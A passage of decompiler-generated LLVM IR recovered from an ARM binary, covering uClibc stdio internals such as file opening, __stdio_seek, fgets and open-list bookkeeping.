  %v2_1a31c = add i32 %v1_1a31c, 4
  %v3_1a31c = inttoptr i32 %v2_1a31c to i32*
  store i32 %v0_1a354, i32* %v3_1a31c, align 4
  br i1 %v9_1a318, label %dec_label_pc_1a324, label %dec_label_pc_1a278

dec_label_pc_1a324:                               ; preds = %dec_label_pc_1a304
  %v0_1a324 = load i32, i32* @r4, align 4
  %v1_1a324 = load i32, i32* @r6, align 4
  %v2_1a324 = sub i32 -1, %v1_1a324
  %v3_1a324 = and i32 %v0_1a324, %v2_1a324
  store i32 %v3_1a324, i32* %r3.global-to-local, align 4
  %v1_1a328 = and i32 %v3_1a324, 1024
  %v2_1a328 = icmp eq i32 %v1_1a328, 0
  store i1 %v2_1a328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a328, label %dec_label_pc_1a348, label %dec_label_pc_1a330

dec_label_pc_1a330:                               ; preds = %dec_label_pc_1a324
  %v0_1a330 = load i32, i32* @r5, align 4
  store i32 %v0_1a330, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_1a33c = call i32 @__libc_fcntl(i32 %v0_1a330, i32 4)
  store i32 %v2_1a33c, i32* %r0.global-to-local, align 4
  %v2_1a340 = icmp eq i32 %v2_1a33c, 0
  store i1 %v2_1a340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a340, label %dec_label_pc_1a330.dec_label_pc_1a348_crit_edge, label %dec_label_pc_1a278

dec_label_pc_1a330.dec_label_pc_1a348_crit_edge:  ; preds = %dec_label_pc_1a330
  %v0_1a348.pre = load i32, i32* @r6, align 4
  %v0_1a34c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a348

dec_label_pc_1a348:                               ; preds = %dec_label_pc_1a330.dec_label_pc_1a348_crit_edge, %dec_label_pc_1a324
  %v0_1a34c = phi i32 [ %v0_1a34c.pre, %dec_label_pc_1a330.dec_label_pc_1a348_crit_edge ], [ %v0_1a324, %dec_label_pc_1a324 ]
  %v0_1a348 = phi i32 [ %v0_1a348.pre, %dec_label_pc_1a330.dec_label_pc_1a348_crit_edge ], [ %v1_1a324, %dec_label_pc_1a324 ]
  %v1_1a348 = and i32 %v0_1a348, 131072
  store i32 %v1_1a348, i32* %r3.global-to-local, align 4
  %v2_1a34c = or i32 %v1_1a348, %v0_1a34c
  store i32 %v2_1a34c, i32* @r4, align 4
  br label %dec_label_pc_1a378

dec_label_pc_1a354:                               ; preds = %dec_label_pc_1a2fc
  %v7_1a354 = icmp eq i32 %v0_1a354, -1
  store i1 %v7_1a354, i1* %cpsr_z.global-to-local, align 1
  %v0_1a360.pre = load i32, i32* @r4, align 4
  br i1 %v7_1a354, label %dec_label_pc_1a354._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_1a354
  %v2_1a358 = or i32 %v0_1a360.pre, ptrtoint ([7 x i8]* @global_var_20000.1632 to i32)
  store i32 %v2_1a358, i32* @r4, align 4
  br label %dec_label_pc_1a354._crit_edge

dec_label_pc_1a354._crit_edge:                    ; preds = %dec_label_pc_1a354, %bb34
  %v0_1a360 = phi i32 [ %v2_1a358, %bb34 ], [ %v0_1a360.pre, %dec_label_pc_1a354 ]
  %v0_1a35c = load i32, i32* @r6, align 4
  store i32 %v0_1a35c, i32* %r0.global-to-local, align 4
  store i32 %v0_1a360, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1a368 = inttoptr i32 %v0_1a35c to i8*
  %v3_1a368 = call i32 @__libc_open(i8* %v2_1a368, i32 %v0_1a360)
  store i32 %v3_1a368, i32* %r0.global-to-local, align 4
  %v1_1a36c = icmp slt i32 %v3_1a368, 0
  %v2_1a36c = icmp eq i32 %v3_1a368, 0
  store i1 %v2_1a36c, i1* %cpsr_z.global-to-local, align 1
  %v1_1a370 = load i32, i32* @r8, align 4
  %v2_1a370 = add i32 %v1_1a370, 4
  %v3_1a370 = inttoptr i32 %v2_1a370 to i32*
  store i32 %v3_1a368, i32* %v3_1a370, align 4
  br i1 %v1_1a36c, label %dec_label_pc_1a28c, label %dec_label_pc_1a378

dec_label_pc_1a378:                               ; preds = %dec_label_pc_1a354._crit_edge, %dec_label_pc_1a348
  %v0_1a378 = load i32, i32* @r8, align 4
  %v1_1a378 = inttoptr i32 %v0_1a378 to i32*
  %v2_1a378 = load i32, i32* %v1_1a378, align 4
  %v1_1a37c = and i32 %v2_1a378, 8192
  store i32 %v1_1a37c, i32* %r3.global-to-local, align 4
  %v3_1a3801 = udiv i32 %v1_1a37c, 256
  store i32 %v3_1a3801, i32* %r2.global-to-local, align 4
  %v1_1a384 = trunc i32 %v3_1a3801 to i8
  %v3_1a384 = add i32 %v0_1a378, 1
  %v4_1a384 = inttoptr i32 %v3_1a384 to i8*
  store i8 %v1_1a384, i8* %v4_1a384, align 1
  %v0_1a388 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a388 = trunc i32 %v0_1a388 to i8
  %v2_1a388 = load i32, i32* @r8, align 4
  %v3_1a388 = inttoptr i32 %v2_1a388 to i8*
  store i8 %v1_1a388, i8* %v3_1a388, align 1
  %v0_1a38c = load i32, i32* @r4, align 4
  %v1_1a38c = and i32 %v0_1a38c, ptrtoint ([7 x i8]* @global_var_20000.1632 to i32)
  store i32 %v1_1a38c, i32* %r1.global-to-local, align 4
  %v2_1a38c = icmp eq i32 %v1_1a38c, 0
  store i1 %v2_1a38c, i1* %cpsr_z.global-to-local, align 1
  %v0_1a390 = load i32, i32* @r8, align 4
  %v1_1a390 = add i32 %v0_1a390, 1
  %v2_1a390 = inttoptr i32 %v1_1a390 to i8*
  %v3_1a390 = load i8, i8* %v2_1a390, align 1
  %v4_1a390 = zext i8 %v3_1a390 to i32
  %v1_1a394 = inttoptr i32 %v0_1a390 to i8*
  %v2_1a394 = load i8, i8* %v1_1a394, align 1
  %v3_1a394 = zext i8 %v2_1a394 to i32
  store i32 %v3_1a394, i32* %r3.global-to-local, align 4
  br i1 %v2_1a38c, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_1a378
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_1a378, %bb35
  %v0_1a3a8 = phi i32 [ 0, %dec_label_pc_1a378 ], [ 32768, %bb35 ]
  %v1_1a39c = and i32 %v0_1a38c, 1024
  store i32 %v1_1a39c, i32* %r0.global-to-local, align 4
  %v4_1a3a4 = mul nuw nsw i32 %v4_1a390, 256
  %v5_1a3a4 = or i32 %v3_1a394, %v4_1a3a4
  %v2_1a3a8 = or i32 %v0_1a3a8, %v1_1a39c
  store i32 %v2_1a3a8, i32* %r1.global-to-local, align 4
  %v2_1a3b0 = or i32 %v5_1a3a4, %v2_1a3a8
  %v1_1a3a0 = mul i32 %v0_1a38c, 16
  %v1_1a3ac = and i32 %v1_1a3a0, 48
  %v1_1a3b4 = add nuw nsw i32 %v1_1a3ac, 16
  %v4_1a3b8 = xor i32 %v1_1a3b4, 48
  %v5_1a3b8 = or i32 %v2_1a3b0, %v4_1a3b8
  store i32 %v5_1a3b8, i32* %r3.global-to-local, align 4
  %v3_1a3bc19 = udiv i32 %v2_1a3b0, 256
  store i32 %v3_1a3bc19, i32* %r2.global-to-local, align 4
  %v1_1a3c0 = trunc i32 %v3_1a3bc19 to i8
  store i8 %v1_1a3c0, i8* %v2_1a390, align 1
  %v0_1a3c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a3c4 = trunc i32 %v0_1a3c4 to i8
  %v2_1a3c4 = load i32, i32* @r8, align 4
  %v3_1a3c4 = inttoptr i32 %v2_1a3c4 to i8*
  store i8 %v1_1a3c4, i8* %v3_1a3c4, align 1
  %v0_1a3c8 = call i32 @__errno_location()
  store i32 %v0_1a3c8, i32* %r0.global-to-local, align 4
  %v0_1a3cc = load i32, i32* @r8, align 4
  %v1_1a3cc = add i32 %v0_1a3cc, 1
  %v2_1a3cc = inttoptr i32 %v1_1a3cc to i8*
  %v3_1a3cc = load i8, i8* %v2_1a3cc, align 1
  %v4_1a3cc = zext i8 %v3_1a3cc to i32
  store i32 %v4_1a3cc, i32* %r3.global-to-local, align 4
  %v1_1a3d0 = inttoptr i32 %v0_1a3cc to i8*
  %v2_1a3d0 = load i8, i8* %v1_1a3d0, align 1
  %v3_1a3d0 = zext i8 %v2_1a3d0 to i32
  store i32 %v0_1a3c8, i32* @r6, align 4
  %v1_1a3d8 = add i32 %v0_1a3cc, 4
  %v2_1a3d8 = inttoptr i32 %v1_1a3d8 to i32*
  %v3_1a3d8 = load i32, i32* %v2_1a3d8, align 4
  store i32 %v3_1a3d8, i32* @r0, align 4
  %v4_1a3dc = mul nuw nsw i32 %v4_1a3cc, 256
  %v5_1a3dc = or i32 %v3_1a3d0, %v4_1a3dc
  store i32 %v5_1a3dc, i32* @r4, align 4
  %v1_1a3e0 = inttoptr i32 %v0_1a3c8 to i32*
  %v2_1a3e0 = load i32, i32* %v1_1a3e0, align 4
  store i32 %v2_1a3e0, i32* @r5, align 4
  %v1_1a3e4 = call i32 @isatty(i32 %v3_1a3d8)
  store i32 %v1_1a3e4, i32* %r0.global-to-local, align 4
  %v0_1a3e8 = load i32, i32* @r4, align 4
  %v4_1a3e8 = mul i32 %v1_1a3e4, 256
  %v5_1a3e8 = or i32 %v0_1a3e8, %v4_1a3e8
  store i32 %v5_1a3e8, i32* @r4, align 4
  %v3_1a3ec = sdiv i32 %v5_1a3e8, 256
  store i32 %v3_1a3ec, i32* %r3.global-to-local, align 4
  %v1_1a3f0 = trunc i32 %v3_1a3ec to i8
  %v2_1a3f0 = load i32, i32* @r8, align 4
  %v3_1a3f0 = add i32 %v2_1a3f0, 1
  %v4_1a3f0 = inttoptr i32 %v3_1a3f0 to i8*
  store i8 %v1_1a3f0, i8* %v4_1a3f0, align 1
  %v0_1a3f4 = load i32, i32* @r4, align 4
  %v1_1a3f4 = trunc i32 %v0_1a3f4 to i8
  %v2_1a3f4 = load i32, i32* @r8, align 4
  %v3_1a3f4 = inttoptr i32 %v2_1a3f4 to i8*
  store i8 %v1_1a3f4, i8* %v3_1a3f4, align 1
  %v0_1a3f8 = load i32, i32* @r5, align 4
  %v1_1a3f8 = load i32, i32* @r6, align 4
  %v2_1a3f8 = inttoptr i32 %v1_1a3f8 to i32*
  store i32 %v0_1a3f8, i32* %v2_1a3f8, align 4
  %v0_1a3fc = load i32, i32* @r8, align 4
  %v1_1a3fc = add i32 %v0_1a3fc, 8
  %v2_1a3fc = inttoptr i32 %v1_1a3fc to i32*
  %v3_1a3fc = load i32, i32* %v2_1a3fc, align 4
  store i32 %v3_1a3fc, i32* %r3.global-to-local, align 4
  %v2_1a400 = icmp eq i32 %v3_1a3fc, 0
  store i1 %v2_1a400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a400, label %dec_label_pc_1a408, label %bb37

dec_label_pc_1a408:                               ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_1a40c = call i32 @malloc(i32 4096)
  store i32 %v1_1a40c, i32* %r0.global-to-local, align 4
  %v2_1a410 = icmp eq i32 %v1_1a40c, 0
  store i1 %v2_1a410, i1* %cpsr_z.global-to-local, align 1
  %v1_1a424.pre = load i32, i32* @r8, align 4
  br i1 %v2_1a410, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_1a408
  %v2_1a42420 = add i32 %v1_1a424.pre, 8
  %v3_1a42421 = inttoptr i32 %v2_1a42420 to i32*
  store i32 0, i32* %v3_1a42421, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_1a408
  %v2_1a414 = inttoptr i32 %v1_1a424.pre to i32*
  %v3_1a414 = load i32, i32* %v2_1a414, align 4
  %v2_1a418 = or i32 %v3_1a414, 16384
  store i32 %v2_1a418, i32* %r3.global-to-local, align 4
  %v2_1a41c = add i32 %v1_1a40c, 4096
  store i32 %v2_1a41c, i32* %r2.global-to-local, align 4
  %v4_1a420 = sdiv i32 %v2_1a418, 256
  store i32 %v4_1a420, i32* %r1.global-to-local, align 4
  %v2_1a424 = add i32 %v1_1a424.pre, 8
  %v3_1a424 = inttoptr i32 %v2_1a424 to i32*
  store i32 %v1_1a40c, i32* %v3_1a424, align 4
  %v1_1a428 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a428 = load i32, i32* @r8, align 4
  %v3_1a428 = add i32 %v2_1a428, 12
  %v4_1a428 = inttoptr i32 %v3_1a428 to i32*
  store i32 %v1_1a428, i32* %v4_1a428, align 4
  %v1_1a42c = load i32, i32* %r1.global-to-local, align 4
  %v2_1a42c = trunc i32 %v1_1a42c to i8
  %v3_1a42c = load i32, i32* @r8, align 4
  %v4_1a42c = add i32 %v3_1a42c, 1
  %v5_1a42c = inttoptr i32 %v4_1a42c to i8*
  store i8 %v2_1a42c, i8* %v5_1a42c, align 1
  %v0_1a430.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a430.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_1a430 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a430 = trunc i32 %v1_1a430 to i8
  %v3_1a430 = load i32, i32* @r8, align 4
  %v4_1a430 = inttoptr i32 %v3_1a430 to i8*
  store i8 %v2_1a430, i8* %v4_1a430, align 1
  %v0_1a434.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a434.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_1a434 = load i32, i32* @r8, align 4
  %v3_1a434 = add i32 %v2_1a434, 12
  %v4_1a434 = inttoptr i32 %v3_1a434 to i32*
  store i32 %v1_1a40c, i32* %v4_1a434, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2b2a8.1635 to i32), i32* %r3.global-to-local, align 4
  %v2_1a440 = load i32, i32* @r8, align 4
  %v3_1a440 = add i32 %v2_1a440, 2
  %v4_1a440 = inttoptr i32 %v3_1a440 to i8*
  store i8 0, i8* %v4_1a440, align 1
  %v0_1a444 = load i32, i32* @r8, align 4
  %v1_1a444 = add i32 %v0_1a444, 1
  %v2_1a444 = inttoptr i32 %v1_1a444 to i8*
  %v3_1a444 = load i8, i8* %v2_1a444, align 1
  %v4_1a444 = zext i8 %v3_1a444 to i32
  store i32 %v4_1a444, i32* %r2.global-to-local, align 4
  %v2_1a448 = load i32, i32* @global_var_2b2a8.1635, align 4
  store i32 %v2_1a448, i32* %r1.global-to-local, align 4
  %v1_1a44c = add i32 %v0_1a444, 8
  %v2_1a44c = inttoptr i32 %v1_1a44c to i32*
  %v3_1a44c = load i32, i32* %v2_1a44c, align 4
  store i32 %v3_1a44c, i32* %r3.global-to-local, align 4
  %v1_1a450 = and i32 %v4_1a444, 32
  %v2_1a450 = icmp eq i32 %v1_1a450, 0
  store i1 %v2_1a450, i1* %cpsr_z.global-to-local, align 1
  %v2_1a454 = add i32 %v0_1a444, 20
  %v3_1a454 = inttoptr i32 %v2_1a454 to i32*
  store i32 %v3_1a44c, i32* %v3_1a454, align 4
  %v0_1a458 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a458 = load i32, i32* @r8, align 4
  %v2_1a458 = add i32 %v1_1a458, 44
  %v3_1a458 = inttoptr i32 %v2_1a458 to i32*
  store i32 %v0_1a458, i32* %v3_1a458, align 4
  %v0_1a45c = load i32, i32* %r1.global-to-local, align 4
  %v1_1a45c = load i32, i32* @r8, align 4
  %v2_1a45c = add i32 %v1_1a45c, 52
  %v3_1a45c = inttoptr i32 %v2_1a45c to i32*
  store i32 %v0_1a45c, i32* %v3_1a45c, align 4
  %v0_1a460 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a460 = load i32, i32* @r8, align 4
  %v2_1a460 = add i32 %v1_1a460, 24
  %v3_1a460 = inttoptr i32 %v2_1a460 to i32*
  store i32 %v0_1a460, i32* %v3_1a460, align 4
  %v0_1a464 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a464 = load i32, i32* @r8, align 4
  %v2_1a464 = add i32 %v1_1a464, 28
  %v3_1a464 = inttoptr i32 %v2_1a464 to i32*
  store i32 %v0_1a464, i32* %v3_1a464, align 4
  %v0_1a468 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a468 = load i32, i32* @r8, align 4
  %v2_1a468 = add i32 %v1_1a468, 16
  %v3_1a468 = inttoptr i32 %v2_1a468 to i32*
  store i32 %v0_1a468, i32* %v3_1a468, align 4
  br i1 %v2_1a450, label %dec_label_pc_1a4fc, label %dec_label_pc_1a470

dec_label_pc_1a470:                               ; preds = %bb37
  %v2_1a470 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1a470, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_176d8.1331 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2b290.1327 to i32), i32* %r2.global-to-local, align 4
  %v1_1a488 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2b290.1327 to i32), i32* %r0.global-to-local, align 4
  %v1_1a498 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_2b278.1325 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_1a24c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_176d8.1331 to i32), i32* %r1.global-to-local, align 4
  %v1_1a4ac = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2b278.1325 to i32), i32* %r0.global-to-local, align 4
  %v1_1a4b8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_2b274.1329 to i32), i32* %r2.global-to-local, align 4
  %v2_1a4c0 = load i32, i32* bitcast (i32** @global_var_2b274.1329 to i32*), align 4
  store i32 %v2_1a4c0, i32* %r3.global-to-local, align 4
  store i32 %v2_1a24c, i32* @r0, align 4
  %v1_1a4c8 = load i32, i32* @r8, align 4
  %v2_1a4c8 = add i32 %v1_1a4c8, 32
  %v3_1a4c8 = inttoptr i32 %v2_1a4c8 to i32*
  store i32 %v2_1a4c0, i32* %v3_1a4c8, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1a4d4 = load i32, i32* @r8, align 4
  %v1_1a4d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a4d4 = inttoptr i32 %v1_1a4d4 to i32*
  store i32 %v0_1a4d4, i32* %v2_1a4d4, align 4
  %v1_1a4dc = call i32 @__pthread_return_void()
  store i32 %v2_1a470, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 107764, i32* @lr, align 4
  %v1_1a4f0 = call i32 @__pthread_return_void()
  store i32 %v1_1a4f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a4fc

dec_label_pc_1a4f8:                               ; preds = %dec_label_pc_1a28c, %dec_label_pc_1a278, %dec_label_pc_1a298
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1a4fc

dec_label_pc_1a4fc:                               ; preds = %bb37, %dec_label_pc_1a2d0, %dec_label_pc_1a470, %dec_label_pc_1a4f8
  %v0_1a4fc = load i32, i32* @r8, align 4
  store i32 %v0_1a4fc, i32* %r0.global-to-local, align 4
  %v2_1a504 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1a504, i32* @r4, align 4
  store i32 %v6_1a240, i32* @r5, align 4
  store i32 %v9_1a240, i32* @r6, align 4
  store i32 %v15_1a240, i32* @r8, align 4
  ret i32 %v0_1a4fc

; uselistorder directives
  uselistorder i32 %v1_1a424.pre, { 1, 0, 2 }
  uselistorder i32 %v3_1a3ec, { 1, 0 }
  uselistorder i32 %v3_1a3801, { 1, 0 }
  uselistorder i32 %v0_1a360, { 1, 0 }
  uselistorder i1 %v7_1a354, { 1, 0 }
  uselistorder i32 %v1_1a324, { 1, 0 }
  uselistorder i32 %v0_1a324, { 1, 0 }
  uselistorder i32 %v1_1a30c, { 1, 0, 2 }
  uselistorder i32 %v1_1a2c0, { 1, 0 }
  uselistorder i32 %v0_1a28c, { 1, 0, 2 }
  uselistorder i1 %v7_1a26c, { 1, 0 }
  uselistorder i1 %v7_1a260, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 19, 18, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 16384, { 15, 0, 5, 10, 3, 11, 4, 12, 1, 13, 2, 14, 6, 7, 8, 9 }
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 2, 5, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 1, 0, 9, 8, 7, 6, 13, 12, 11, 10, 5, 4, 3, 2 }
  uselistorder i32 ()* @__stdio_init_mutex, { 0, 4, 3, 2, 1 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 17, 16, 15, 14, 0 }
  uselistorder i32 22, { 0, 12, 3, 13, 4, 10, 5, 6, 7, 16, 14, 8, 15, 9, 1, 2, 11 }
  uselistorder label %dec_label_pc_1a4fc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1a4f8, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_1a354._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1a2fc, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1a2a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a278, { 1, 2, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a508:
  %v0_1a508 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a508, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a508
  %v5_1a508 = sdiv i32 %arg2, 16
  %v6_1a508 = and i32 %v5_1a508, %arg1
  %v5_1a50c = sdiv i32 %arg2, 256
  %v6_1a50c = and i32 %v6_1a508, %v5_1a50c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a508, %bb
  %v7_1a50c = phi i32 [ %arg1, %dec_label_pc_1a508 ], [ %v6_1a50c, %bb ]
  ret i32 %v7_1a50c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_1a53c = load i32, i32* @r4, align 4
  %v6_1a53c = load i32, i32* @lr, align 4
  %v1_1a540 = add i32 %arg1, 4
  %v2_1a540 = inttoptr i32 %v1_1a540 to i32*
  %v3_1a540 = load i32, i32* %v2_1a540, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1a548 = load i32, i32* %arg2, align 4
  %v3_1a548 = add i32 %tmp, 4
  %v4_1a548 = inttoptr i32 %v3_1a548 to i32*
  %v5_1a548 = load i32, i32* %v4_1a548, align 4
  %v6_1a54c = call i32 @__libc_lseek64(i32 %v3_1a540, i32 %v2_1a548, i32 %v5_1a548, i32 %arg3, i32 %v3_1a53c, i32 %v6_1a53c)
  %v1_1a550 = icmp slt i32 %v2_1a548, 0
  %v6_1a54c. = select i1 %v1_1a550, i32 %v6_1a54c, i32 0
  store i32 %v6_1a54c., i32* %r3.global-to-local, align 4
  br i1 %v1_1a550, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_1a55c = load i32, i32* @r4, align 4
  %v4_1a55c = inttoptr i32 %v3_1a55c to i32*
  store i32 %v6_1a54c, i32* %v4_1a55c, align 4
  %v6_1a55c = add i32 %v3_1a55c, 4
  %v7_1a55c = inttoptr i32 %v6_1a55c to i32*
  store i32 %v2_1a548, i32* %v7_1a55c, align 4
  %v0_1a560.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_1a560 = phi i32 [ %v6_1a54c, %entry ], [ %v0_1a560.pre, %bb ]
  ret i32 %v0_1a560

; uselistorder directives
  uselistorder i32 %v6_1a54c, { 0, 2, 1 }
  uselistorder i32 %v2_1a548, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1a568 = load i32, i32* @r4, align 4
  store i32 %v3_1a568, i32* %stack_var_-24, align 4
  %v6_1a568 = load i32, i32* @r5, align 4
  %v9_1a568 = load i32, i32* @r6, align 4
  %v12_1a568 = load i32, i32* @r7, align 4
  %v1_1a56c = add i32 %arg3, 52
  %v2_1a56c = inttoptr i32 %v1_1a56c to i32*
  %v3_1a56c = load i32, i32* %v2_1a56c, align 4
  store i32 %v3_1a56c, i32* %r8.global-to-local, align 4
  %v2_1a570 = ptrtoint i32* %stack_var_-40 to i32
  %v1_1a574 = add i32 %arg3, 56
  store i32 %v1_1a574, i32* @r5, align 4
  %v2_1a578 = icmp eq i32 %v3_1a56c, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_1a570, i32* @r0, align 4
  br i1 %v2_1a578, label %dec_label_pc_1a598, label %dec_label_pc_1a5b4

dec_label_pc_1a598:                               ; preds = %entry
  %v1_1a5a0 = call i32 @__pthread_return_void()
  store i32 107956, i32* @lr, align 4
  %v1_1a5b0 = call i32 @__pthread_return_0()
  %v0_1a5b4.pre = load i32, i32* @r6, align 4
  %v0_1a5b8.pre = load i32, i32* @r4, align 4
  %v0_1a5bc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a5b4

dec_label_pc_1a5b4:                               ; preds = %entry, %dec_label_pc_1a598
  %v0_1a5bc = phi i32 [ %arg1, %entry ], [ %v0_1a5bc.pre, %dec_label_pc_1a598 ]
  %v0_1a5b8 = phi i32 [ %arg3, %entry ], [ %v0_1a5b8.pre, %dec_label_pc_1a598 ]
  %v0_1a5b4 = phi i32 [ %arg2, %entry ], [ %v0_1a5b4.pre, %dec_label_pc_1a598 ]
  %v3_1a5c0 = inttoptr i32 %v0_1a5bc to i8*
  %v4_1a5c0 = call i32 @__GI_fgets_unlocked(i8* %v3_1a5c0, i32 %v0_1a5b4, i32 %v0_1a5b8)
  %v0_1a5c4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a5c4 = icmp eq i32 %v0_1a5c4, 0
  store i32 %v4_1a5c0, i32* %r4.global-to-local, align 4
  br i1 %v2_1a5c4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1a5b4
  store i32 108000, i32* @lr, align 4
  call void @__pseudo_branch(i32 95968)
  %v0_1a5e0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1a5b4, %bb
  %v0_1a5e0 = phi i32 [ %v4_1a5c0, %dec_label_pc_1a5b4 ], [ %v0_1a5e0.pre, %bb ]
  %v2_1a5e8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1a5e8, i32* @r4, align 4
  store i32 %v6_1a568, i32* @r5, align 4
  store i32 %v9_1a568, i32* @r6, align 4
  store i32 %v12_1a568, i32* @r7, align 4
  ret i32 %v0_1a5e0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1a5b4, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_1a600 = ptrtoint i32* %stack_var_-48 to i32
  %v2_1a604 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1a604, i32* @r0, align 4
  store i32 95968, i32* %r4.global-to-local, align 4
  %v1_1a618 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_176d8.1331 to i32), i32* %r5.global-to-local, align 4
  %v1_1a628 = call i32 @__pthread_return_0()
  %v2_1a630 = load i32, i32* @global_var_2f5ec.1619, align 4
  %v7_1a634 = icmp eq i32 %v2_1a630, 1
  br i1 %v7_1a634, label %dec_label_pc_1a63c, label %dec_label_pc_1a6e8

dec_label_pc_1a63c:                               ; preds = %entry
